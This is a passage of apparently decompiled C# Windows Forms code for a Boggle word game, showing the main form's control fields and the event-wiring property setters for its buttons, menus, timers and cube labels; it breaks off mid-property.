using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.OleDb;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Boggle;

public class frmMain : Form
{
	[AccessedThroughProperty("lbl14")]
	private CircleLabel _lbl14;

	[AccessedThroughProperty("BogBorder10")]
	private BogBorder _BogBorder10;

	[AccessedThroughProperty("lbl13")]
	private CircleLabel _lbl13;

	[AccessedThroughProperty("lbl12")]
	private CircleLabel _lbl12;

	[AccessedThroughProperty("lbl15")]
	private CircleLabel _lbl15;

	[AccessedThroughProperty("lbl11")]
	private CircleLabel _lbl11;

	[AccessedThroughProperty("lbl10")]
	private CircleLabel _lbl10;

	[AccessedThroughProperty("lbl9")]
	private CircleLabel _lbl9;

	[AccessedThroughProperty("lbl8")]
	private CircleLabel _lbl8;

	[AccessedThroughProperty("lbl7")]
	private CircleLabel _lbl7;

	[AccessedThroughProperty("lbl6")]
	private CircleLabel _lbl6;

	[AccessedThroughProperty("lbl16")]
	private CircleLabel _lbl16;

	[AccessedThroughProperty("lbl5")]
	private CircleLabel _lbl5;

	[AccessedThroughProperty("BogBorder11")]
	private BogBorder _BogBorder11;

	[AccessedThroughProperty("btnAddWord")]
	private BogButton _btnAddWord;

	[AccessedThroughProperty("lbl2")]
	private CircleLabel _lbl2;

	[AccessedThroughProperty("lbl3")]
	private CircleLabel _lbl3;

	[AccessedThroughProperty("mnuMain")]
	private MainMenu _mnuMain;

	[AccessedThroughProperty("lbl4")]
	private CircleLabel _lbl4;

	[AccessedThroughProperty("BogBorder12")]
	private BogBorder _BogBorder12;

	[AccessedThroughProperty("lbl1")]
	private CircleLabel _lbl1;

	[AccessedThroughProperty("BogBorder8")]
	private BogBorder _BogBorder8;

	[AccessedThroughProperty("BogBorder13")]
	private BogBorder _BogBorder13;

	[AccessedThroughProperty("BogBorder7")]
	private BogBorder _BogBorder7;

	[AccessedThroughProperty("mnuGame")]
	private MenuItem _mnuGame;

	[AccessedThroughProperty("BogBorder6")]
	private BogBorder _BogBorder6;

	[AccessedThroughProperty("BogBorder14")]
	private BogBorder _BogBorder14;

	[AccessedThroughProperty("BogBorder2")]
	private BogBorder _BogBorder2;

	[AccessedThroughProperty("BogBorder15")]
	private BogBorder _BogBorder15;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("mnuNewGame")]
	private MenuItem _mnuNewGame;

	[AccessedThroughProperty("mnuExitGame")]
	private MenuItem _mnuExitGame;

	[AccessedThroughProperty("BogBorder16")]
	private BogBorder _BogBorder16;

	[AccessedThroughProperty("mnuOptions")]
	private MenuItem _mnuOptions;

	[AccessedThroughProperty("txtWordFound")]
	private TextBox _txtWordFound;

	[AccessedThroughProperty("lstHumanWordsFound")]
	private ListBox _lstHumanWordsFound;

	[AccessedThroughProperty("mnuHelp")]
	private MenuItem _mnuHelp;

	[AccessedThroughProperty("tmrContMain")]
	private Timer _tmrContMain;

	[AccessedThroughProperty("tmrMain")]
	private BogTimer _tmrMain;

	[AccessedThroughProperty("picCubeDown")]
	private PictureBox _picCubeDown;

	[AccessedThroughProperty("lstCompFoundWords")]
	private ListBox _lstCompFoundWords;

	[AccessedThroughProperty("tmrBtn1")]
	private Button _tmrBtn1;

	[AccessedThroughProperty("tmrBtn2")]
	private Button _tmrBtn2;

	[AccessedThroughProperty("tmrBtn3")]
	private Button _tmrBtn3;

	[AccessedThroughProperty("CircleLabel3")]
	private CircleLabel _CircleLabel3;

	[AccessedThroughProperty("CircleLabel2")]
	private CircleLabel _CircleLabel2;

	[AccessedThroughProperty("CircleLabel1")]
	private CircleLabel _CircleLabel1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("picCubesUp")]
	private PictureBox _picCubesUp;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("BogBorder1")]
	private BogBorder _BogBorder1;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("BogBorder3")]
	private BogBorder _BogBorder3;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("BogBorder4")]
	private BogBorder _BogBorder4;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("txtMain")]
	private RichTextBox _txtMain;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[AccessedThroughProperty("tmrBtn4")]
	private Button _tmrBtn4;

	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[AccessedThroughProperty("BogBorder5")]
	private BogBorder _BogBorder5;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("lblRound")]
	private Label _lblRound;

	[AccessedThroughProperty("Label8")]
	private Label _Label8;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	[AccessedThroughProperty("lblComputerRounds")]
	private Label _lblComputerRounds;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("lblHumanRounds")]
	private Label _lblHumanRounds;

	[AccessedThroughProperty("MenuItem8")]
	private MenuItem _MenuItem8;

	[AccessedThroughProperty("lblHumanScore")]
	private Label _lblHumanScore;

	[AccessedThroughProperty("mnuHighScores")]
	private MenuItem _mnuHighScores;

	[AccessedThroughProperty("lblCompScore")]
	private Label _lblCompScore;

	[AccessedThroughProperty("lblHumanWordsCount")]
	private Label _lblHumanWordsCount;

	[AccessedThroughProperty("lblCompWordsCount")]
	private Label _lblCompWordsCount;

	[AccessedThroughProperty("mnuTips")]
	private MenuItem _mnuTips;

	[AccessedThroughProperty("pnlCubes")]
	private BogPanel _pnlCubes;

	[AccessedThroughProperty("pnlTimer")]
	private BogPanel _pnlTimer;

	[AccessedThroughProperty("pnlScore")]
	private BogPanel _pnlScore;

	[AccessedThroughProperty("MenuItem6")]
	private MenuItem _MenuItem6;

	[AccessedThroughProperty("btnFinish")]
	private BogButton _btnFinish;

	[AccessedThroughProperty("pnlWords")]
	private BogPanel _pnlWords;

	[AccessedThroughProperty("mnuEnableWordValidation")]
	private MenuItem _mnuEnableWordValidation;

	[AccessedThroughProperty("MenuItem5")]
	private MenuItem _MenuItem5;

	[AccessedThroughProperty("btnScramble")]
	private BogButton _btnScramble;

	[AccessedThroughProperty("mnuMode")]
	private MenuItem _mnuMode;

	[AccessedThroughProperty("btnContinue")]
	private BogButton _btnContinue;

	[AccessedThroughProperty("mnuEnableTimerFlash")]
	private MenuItem _mnuEnableTimerFlash;

	[AccessedThroughProperty("mnuTmr500")]
	private MenuItem _mnuTmr500;

	[AccessedThroughProperty("mnuBoardGameMode")]
	private MenuItem _mnuBoardGameMode;

	[AccessedThroughProperty("mnuTmr430")]
	private MenuItem _mnuTmr430;

	[AccessedThroughProperty("mnuTmr400")]
	private MenuItem _mnuTmr400;

	[AccessedThroughProperty("mnuTmr330")]
	private MenuItem _mnuTmr330;

	[AccessedThroughProperty("mnuTmr300")]
	private MenuItem _mnuTmr300;

	[AccessedThroughProperty("mnuVsMode")]
	private MenuItem _mnuVsMode;

	[AccessedThroughProperty("mnuTmr230")]
	private MenuItem _mnuTmr230;

	[AccessedThroughProperty("mnuTmr200")]
	private MenuItem _mnuTmr200;

	[AccessedThroughProperty("mnuTmr130")]
	private MenuItem _mnuTmr130;

	[AccessedThroughProperty("BogBorder9")]
	private BogBorder _BogBorder9;

	[AccessedThroughProperty("mnuTeachingMode")]
	private MenuItem _mnuTeachingMode;

	[AccessedThroughProperty("mnuTmr100")]
	private MenuItem _mnuTmr100;

	[AccessedThroughProperty("mnuTmr30")]
	private MenuItem _mnuTmr30;

	[AccessedThroughProperty("mnuTimerInterval")]
	private MenuItem _mnuTimerInterval;

	[AccessedThroughProperty("mnuEndGame")]
	private MenuItem _mnuEndGame;

	[AccessedThroughProperty("MenuItem4")]
	private MenuItem _MenuItem4;

	[AccessedThroughProperty("mnuLevelImpossible")]
	private MenuItem _mnuLevelImpossible;

	[AccessedThroughProperty("mnuLevelHard")]
	private MenuItem _mnuLevelHard;

	[AccessedThroughProperty("mnuLevelMedium")]
	private MenuItem _mnuLevelMedium;

	[AccessedThroughProperty("MenuItem2")]
	private MenuItem _MenuItem2;

	[AccessedThroughProperty("mnuLevelEasy")]
	private MenuItem _mnuLevelEasy;

	[AccessedThroughProperty("MenuItem3")]
	private MenuItem _MenuItem3;

	[AccessedThroughProperty("mnuAbout")]
	private MenuItem _mnuAbout;

	[AccessedThroughProperty("MenuItem1")]
	private MenuItem _MenuItem1;

	[AccessedThroughProperty("mnuEnableDefSearch")]
	private MenuItem _mnuEnableDefSearch;

	private IContainer components;

	public DataTable FoundWords;

	public string[] WordsChosen;

	public Thread ShowWordThread;

	public Thread ShowTextThread;

	public Thread FindWordsThread;

	public double ScramSec;

	public bool LoadTextShown;

	public int Min;

	public double Sec;

	public int Round;

	public int ComputerRounds;

	public int HumanRounds;

	public int HumanScore;

	public int ComputerScore;

	[SpecialName]
	private bool _0024STATIC_0024tmrContMain_Tick_002420211C1211_0024TimerGoing;

	[SpecialName]
	private bool[,] _0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection;

	[SpecialName]
	private int _0024STATIC_0024tmrContMain_Tick_002420211C1211_0024LoadWaitTime;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection_0024Init;

	internal virtual MenuItem mnuEnableTimerFlash
	{
		get
		{
			return _mnuEnableTimerFlash;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuEnableTimerFlash != null)
			{
				_mnuEnableTimerFlash.remove_Click((EventHandler)mnuEnableTimerFlash_Click);
			}
			_mnuEnableTimerFlash = value;
			if (_mnuEnableTimerFlash != null)
			{
				_mnuEnableTimerFlash.add_Click((EventHandler)mnuEnableTimerFlash_Click);
			}
		}
	}

	internal virtual CircleLabel lbl13
	{
		get
		{
			return _lbl13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl13 != null)
			{
				_lbl13.CubeClick -= CubeClick;
			}
			_lbl13 = value;
			if (_lbl13 != null)
			{
				_lbl13.CubeClick += CubeClick;
			}
		}
	}

	internal virtual Label lblHumanWordsCount
	{
		get
		{
			return _lblHumanWordsCount;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lblHumanWordsCount == null)
			{
			}
			_lblHumanWordsCount = value;
			if (_lblHumanWordsCount != null)
			{
			}
		}
	}

	internal virtual BogButton btnContinue
	{
		get
		{
			return _btnContinue;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnContinue != null)
			{
				((Control)_btnContinue).remove_Click((EventHandler)btnContinue_Click_1);
			}
			_btnContinue = value;
			if (_btnContinue != null)
			{
				((Control)_btnContinue).add_Click((EventHandler)btnContinue_Click_1);
			}
		}
	}

	internal virtual Label lblCompWordsCount
	{
		get
		{
			return _lblCompWordsCount;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lblCompWordsCount == null)
			{
			}
			_lblCompWordsCount = value;
			if (_lblCompWordsCount != null)
			{
			}
		}
	}

	internal virtual CircleLabel lbl14
	{
		get
		{
			return _lbl14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl14 != null)
			{
				_lbl14.CubeClick -= CubeClick;
			}
			_lbl14 = value;
			if (_lbl14 != null)
			{
				_lbl14.CubeClick += CubeClick;
			}
		}
	}

	internal virtual BogButton btnScramble
	{
		get
		{
			return _btnScramble;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnScramble != null)
			{
				((Control)_btnScramble).remove_Click((EventHandler)btnScramble_Click_1);
			}
			_btnScramble = value;
			if (_btnScramble != null)
			{
				((Control)_btnScramble).add_Click((EventHandler)btnScramble_Click_1);
			}
		}
	}

	internal virtual BogPanel pnlCubes
	{
		get
		{
			return _pnlCubes;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_pnlCubes == null)
			{
			}
			_pnlCubes = value;
			if (_pnlCubes != null)
			{
			}
		}
	}

	internal virtual CircleLabel lbl15
	{
		get
		{
			return _lbl15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl15 != null)
			{
				_lbl15.CubeClick -= CubeClick;
			}
			_lbl15 = value;
			if (_lbl15 != null)
			{
				_lbl15.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem MenuItem5
	{
		get
		{
			return _MenuItem5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_MenuItem5 == null)
			{
			}
			_MenuItem5 = value;
			if (_MenuItem5 != null)
			{
			}
		}
	}

	internal virtual BogPanel pnlTimer
	{
		get
		{
			return _pnlTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_pnlTimer == null)
			{
			}
			_pnlTimer = value;
			if (_pnlTimer != null)
			{
			}
		}
	}

	internal virtual CircleLabel lbl16
	{
		get
		{
			return _lbl16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl16 != null)
			{
				_lbl16.CubeClick -= CubeClick;
			}
			_lbl16 = value;
			if (_lbl16 != null)
			{
				_lbl16.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuEnableWordValidation
	{
		get
		{
			return _mnuEnableWordValidation;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuEnableWordValidation != null)
			{
				_mnuEnableWordValidation.remove_Click((EventHandler)mnuEnableWordValidation_Click);
			}
			_mnuEnableWordValidation = value;
			if (_mnuEnableWordValidation != null)
			{
				_mnuEnableWordValidation.add_Click((EventHandler)mnuEnableWordValidation_Click);
			}
		}
	}

	internal virtual BogPanel pnlScore
	{
		get
		{
			return _pnlScore;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_pnlScore == null)
			{
			}
			_pnlScore = value;
			if (_pnlScore != null)
			{
			}
		}
	}

	internal virtual BogButton btnAddWord
	{
		get
		{
			return _btnAddWord;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnAddWord != null)
			{
				((Control)_btnAddWord).remove_Click((EventHandler)btnAddWord_Click);
			}
			_btnAddWord = value;
			if (_btnAddWord != null)
			{
				((Control)_btnAddWord).add_Click((EventHandler)btnAddWord_Click);
			}
		}
	}

	internal virtual BogButton btnFinish
	{
		get
		{
			return _btnFinish;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnFinish != null)
			{
				((Control)_btnFinish).remove_Click((EventHandler)btnFinish_Click);
			}
			_btnFinish = value;
			if (_btnFinish != null)
			{
				((Control)_btnFinish).add_Click((EventHandler)btnFinish_Click);
			}
		}
	}

	internal virtual BogPanel pnlWords
	{
		get
		{
			return _pnlWords;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_pnlWords == null)
			{
			}
			_pnlWords = value;
			if (_pnlWords != null)
			{
			}
		}
	}

	internal virtual MainMenu mnuMain
	{
		get
		{
			return _mnuMain;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuMain == null)
			{
			}
			_mnuMain = value;
			if (_mnuMain != null)
			{
			}
		}
	}

	internal virtual MenuItem MenuItem6
	{
		get
		{
			return _MenuItem6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_MenuItem6 == null)
			{
			}
			_MenuItem6 = value;
			if (_MenuItem6 != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuMode
	{
		get
		{
			return _mnuMode;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuMode == null)
			{
			}
			_mnuMode = value;
			if (_mnuMode != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuGame
	{
		get
		{
			return _mnuGame;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuGame == null)
			{
			}
			_mnuGame = value;
			if (_mnuGame != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuTips
	{
		get
		{
			return _mnuTips;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTips != null)
			{
				_mnuTips.remove_Click((EventHandler)mnuTips_Click);
			}
			_mnuTips = value;
			if (_mnuTips != null)
			{
				_mnuTips.add_Click((EventHandler)mnuTips_Click);
			}
		}
	}

	internal virtual MenuItem mnuBoardGameMode
	{
		get
		{
			return _mnuBoardGameMode;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuBoardGameMode != null)
			{
				_mnuBoardGameMode.remove_Click((EventHandler)ChangeMode);
			}
			_mnuBoardGameMode = value;
			if (_mnuBoardGameMode != null)
			{
				_mnuBoardGameMode.add_Click((EventHandler)ChangeMode);
			}
		}
	}

	internal virtual MenuItem mnuNewGame
	{
		get
		{
			return _mnuNewGame;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuNewGame != null)
			{
				_mnuNewGame.remove_Click((EventHandler)mnuNewGame_Click);
			}
			_mnuNewGame = value;
			if (_mnuNewGame != null)
			{
				_mnuNewGame.add_Click((EventHandler)mnuNewGame_Click);
			}
		}
	}

	internal virtual MenuItem mnuHighScores
	{
		get
		{
			return _mnuHighScores;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuHighScores != null)
			{
				_mnuHighScores.remove_Click((EventHandler)mnuHighScores_Click);
			}
			_mnuHighScores = value;
			if (_mnuHighScores != null)
			{
				_mnuHighScores.add_Click((EventHandler)mnuHighScores_Click);
			}
		}
	}

	internal virtual MenuItem mnuVsMode
	{
		get
		{
			return _mnuVsMode;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuVsMode != null)
			{
				_mnuVsMode.remove_Click((EventHandler)ChangeMode);
			}
			_mnuVsMode = value;
			if (_mnuVsMode != null)
			{
				_mnuVsMode.add_Click((EventHandler)ChangeMode);
			}
		}
	}

	internal virtual MenuItem mnuExitGame
	{
		get
		{
			return _mnuExitGame;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuExitGame != null)
			{
				_mnuExitGame.remove_Click((EventHandler)mnuExitGame_Click);
			}
			_mnuExitGame = value;
			if (_mnuExitGame != null)
			{
				_mnuExitGame.add_Click((EventHandler)mnuExitGame_Click);
			}
		}
	}

	internal virtual MenuItem MenuItem8
	{
		get
		{
			return _MenuItem8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_MenuItem8 == null)
			{
			}
			_MenuItem8 = value;
			if (_MenuItem8 != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuTeachingMode
	{
		get
		{
			return _mnuTeachingMode;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTeachingMode != null)
			{
				_mnuTeachingMode.remove_Click((EventHandler)ChangeMode);
			}
			_mnuTeachingMode = value;
			if (_mnuTeachingMode != null)
			{
				_mnuTeachingMode.add_Click((EventHandler)ChangeMode);
			}
		}
	}

	internal virtual MenuItem mnuOptions
	{
		get
		{
			return _mnuOptions;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuOptions == null)
			{
			}
			_mnuOptions = value;
			if (_mnuOptions != null)
			{
			}
		}
	}

	internal virtual Label lblHumanRounds
	{
		get
		{
			return _lblHumanRounds;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lblHumanRounds == null)
			{
			}
			_lblHumanRounds = value;
			if (_lblHumanRounds != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuEndGame
	{
		get
		{
			return _mnuEndGame;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuEndGame != null)
			{
				_mnuEndGame.remove_Click((EventHandler)mnuEndGame_Click);
			}
			_mnuEndGame = value;
			if (_mnuEndGame != null)
			{
				_mnuEndGame.add_Click((EventHandler)mnuEndGame_Click);
			}
		}
	}

	internal virtual MenuItem mnuHelp
	{
		get
		{
			return _mnuHelp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuHelp == null)
			{
			}
			_mnuHelp = value;
			if (_mnuHelp != null)
			{
			}
		}
	}

	internal virtual MenuItem MenuItem2
	{
		get
		{
			return _MenuItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_MenuItem2 == null)
			{
			}
			_MenuItem2 = value;
			if (_MenuItem2 != null)
			{
			}
		}
	}

	internal virtual Label lblComputerRounds
	{
		get
		{
			return _lblComputerRounds;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lblComputerRounds == null)
			{
			}
			_lblComputerRounds = value;
			if (_lblComputerRounds != null)
			{
			}
		}
	}

	internal virtual Timer tmrContMain
	{
		get
		{
			return _tmrContMain;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_tmrContMain != null)
			{
				_tmrContMain.remove_Tick((EventHandler)tmrContMain_Tick);
			}
			_tmrContMain = value;
			if (_tmrContMain != null)
			{
				_tmrContMain.add_Tick((EventHandler)tmrContMain_Tick);
			}
		}
	}

	internal virtual MenuItem MenuItem1
	{
		get
		{
			return _MenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_MenuItem1 == null)
			{
			}
			_MenuItem1 = value;
			if (_MenuItem1 != null)
			{
			}
		}
	}

	internal virtual Label Label7
	{
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label7 == null)
			{
			}
			_Label7 = value;
			if (_Label7 != null)
			{
			}
		}
	}

	internal virtual BogTimer tmrMain
	{
		get
		{
			return _tmrMain;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_tmrMain == null)
			{
			}
			_tmrMain = value;
			if (_tmrMain != null)
			{
			}
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label1 == null)
			{
			}
			_Label1 = value;
			if (_Label1 != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuEnableDefSearch
	{
		get
		{
			return _mnuEnableDefSearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuEnableDefSearch != null)
			{
				_mnuEnableDefSearch.remove_Click((EventHandler)mnuEnableDefSearch_Click);
			}
			_mnuEnableDefSearch = value;
			if (_mnuEnableDefSearch != null)
			{
				_mnuEnableDefSearch.add_Click((EventHandler)mnuEnableDefSearch_Click);
			}
		}
	}

	internal virtual Label Label8
	{
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label8 == null)
			{
			}
			_Label8 = value;
			if (_Label8 != null)
			{
			}
		}
	}

	internal virtual PictureBox picCubeDown
	{
		get
		{
			return _picCubeDown;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_picCubeDown == null)
			{
			}
			_picCubeDown = value;
			if (_picCubeDown != null)
			{
			}
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label2 == null)
			{
			}
			_Label2 = value;
			if (_Label2 != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuAbout
	{
		get
		{
			return _mnuAbout;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuAbout != null)
			{
				_mnuAbout.remove_Click((EventHandler)mnuAbout_Click);
			}
			_mnuAbout = value;
			if (_mnuAbout != null)
			{
				_mnuAbout.add_Click((EventHandler)mnuAbout_Click);
			}
		}
	}

	internal virtual Label lblRound
	{
		get
		{
			return _lblRound;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lblRound == null)
			{
			}
			_lblRound = value;
			if (_lblRound != null)
			{
			}
		}
	}

	internal virtual ListBox lstHumanWordsFound
	{
		get
		{
			return _lstHumanWordsFound;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			if (_lstHumanWordsFound != null)
			{
				((Control)_lstHumanWordsFound).remove_MouseUp(new MouseEventHandler(lstHumanWordsFound_MouseUp));
			}
			_lstHumanWordsFound = value;
			if (_lstHumanWordsFound != null)
			{
				((Control)_lstHumanWordsFound).add_MouseUp(new MouseEventHandler(lstHumanWordsFound_MouseUp));
			}
		}
	}

	internal virtual Label Label3
	{
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label3 == null)
			{
			}
			_Label3 = value;
			if (_Label3 != null)
			{
			}
		}
	}

	internal virtual MenuItem MenuItem3
	{
		get
		{
			return _MenuItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_MenuItem3 == null)
			{
			}
			_MenuItem3 = value;
			if (_MenuItem3 != null)
			{
			}
		}
	}

	internal virtual Label Label6
	{
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label6 == null)
			{
			}
			_Label6 = value;
			if (_Label6 != null)
			{
			}
		}
	}

	internal virtual TextBox txtWordFound
	{
		get
		{
			return _txtWordFound;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			if (_txtWordFound != null)
			{
				((Control)_txtWordFound).remove_KeyPress(new KeyPressEventHandler(txtWordFound_KeyPress));
			}
			_txtWordFound = value;
			if (_txtWordFound != null)
			{
				((Control)_txtWordFound).add_KeyPress(new KeyPressEventHandler(txtWordFound_KeyPress));
			}
		}
	}

	internal virtual Label Label4
	{
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label4 == null)
			{
			}
			_Label4 = value;
			if (_Label4 != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuLevelEasy
	{
		get
		{
			return _mnuLevelEasy;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuLevelEasy != null)
			{
				_mnuLevelEasy.remove_Click((EventHandler)ChangeLevel);
			}
			_mnuLevelEasy = value;
			if (_mnuLevelEasy != null)
			{
				_mnuLevelEasy.add_Click((EventHandler)ChangeLevel);
			}
		}
	}

	internal virtual BogBorder BogBorder5
	{
		get
		{
			return _BogBorder5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder5 == null)
			{
			}
			_BogBorder5 = value;
			if (_BogBorder5 != null)
			{
			}
		}
	}

	internal virtual Panel Panel1
	{
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Panel1 == null)
			{
			}
			_Panel1 = value;
			if (_Panel1 != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder2
	{
		get
		{
			return _BogBorder2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder2 == null)
			{
			}
			_BogBorder2 = value;
			if (_BogBorder2 != null)
			{
			}
		}
	}

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_PictureBox1 == null)
			{
			}
			_PictureBox1 = value;
			if (_PictureBox1 != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuLevelMedium
	{
		get
		{
			return _mnuLevelMedium;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuLevelMedium != null)
			{
				_mnuLevelMedium.remove_Click((EventHandler)ChangeLevel);
			}
			_mnuLevelMedium = value;
			if (_mnuLevelMedium != null)
			{
				_mnuLevelMedium.add_Click((EventHandler)ChangeLevel);
			}
		}
	}

	internal virtual Panel Panel3
	{
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Panel3 == null)
			{
			}
			_Panel3 = value;
			if (_Panel3 != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder9
	{
		get
		{
			return _BogBorder9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder9 == null)
			{
			}
			_BogBorder9 = value;
			if (_BogBorder9 != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder6
	{
		get
		{
			return _BogBorder6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder6 == null)
			{
			}
			_BogBorder6 = value;
			if (_BogBorder6 != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuLevelHard
	{
		get
		{
			return _mnuLevelHard;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuLevelHard != null)
			{
				_mnuLevelHard.remove_Click((EventHandler)ChangeLevel);
			}
			_mnuLevelHard = value;
			if (_mnuLevelHard != null)
			{
				_mnuLevelHard.add_Click((EventHandler)ChangeLevel);
			}
		}
	}

	internal virtual Panel Panel2
	{
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
